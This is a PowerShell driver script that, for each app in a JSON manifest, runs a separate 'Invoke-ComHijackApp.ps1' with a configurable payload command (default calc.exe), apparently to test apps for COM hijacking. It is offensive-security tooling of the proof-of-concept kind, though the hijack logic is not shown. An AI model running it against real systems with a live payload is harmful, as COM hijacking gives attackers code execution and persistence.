param(
    [string[]]$AppNames,
    [string]$ConfigPath,
    [string]$PayloadCommand = 'C:\Windows\System32\calc.exe',
    [int]$CaptureSeconds = 20,
    [int]$TestWaitSeconds = 0,
    [int]$MaxCandidates = 10,
    [switch]$KillExisting
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path

if ([string]::IsNullOrWhiteSpace($ConfigPath)) {
    $ConfigPath = Join-Path $scriptDirectory '..\assets\apps.json'
}

if (-not $AppNames -or $AppNames.Count -eq 0) {
    if (-not (Test-Path -LiteralPath $ConfigPath)) {
        throw "Unable to load app names because the manifest was not found at $ConfigPath"
    }

    $apps = Get-Content -LiteralPath $ConfigPath -Raw | ConvertFrom-Json
    $AppNames = @($apps | ForEach-Object { $_.AppName })
}

$results = @()
foreach ($appName in $AppNames) {
    $results += & (Join-Path $scriptDirectory 'Invoke-ComHijackApp.ps1') `
        -AppName $appName `
        -ConfigPath $ConfigPath `
        -PayloadCommand $PayloadCommand `
        -CaptureSeconds $CaptureSeconds `
        -TestWaitSeconds $TestWaitSeconds `
        -MaxCandidates $MaxCandidates `
        -KillExisting:$KillExisting
}

$results
